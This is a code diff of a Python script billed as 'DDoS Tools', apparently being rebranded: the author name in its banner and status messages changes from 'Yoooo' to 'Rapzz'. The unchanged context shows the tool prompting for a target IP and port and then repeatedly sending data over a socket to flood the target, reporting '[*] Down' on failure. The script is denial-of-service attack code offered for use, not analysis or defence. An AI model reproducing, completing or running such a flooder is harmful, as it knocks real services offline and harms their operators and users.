@@ -7,8 +7,8 @@ import threading
 import os
 
 os.system("clear")
-print("DDoS Tools By Yoooo [Beta Version]")
-print("Bismilah Tembus")
+print("DDoS Tools By Rapzz [Beta Version]")
+print("NO RENAME CLUB")
 ip = str(input(" Ip: "))
 port = int(input(" Port: "))
 choice = str(input(" Gas?(y/n): "))
@@ -37,7 +37,7 @@ def run2():
       s.send(data)
       for x in range(times):
         s.send(data)
-      print(i +" Yoooooooo Di Sini!!!")
+      print(i +" Rapzz Di Sini!!!")
     except:
       s.close()
       print("[*] Down")
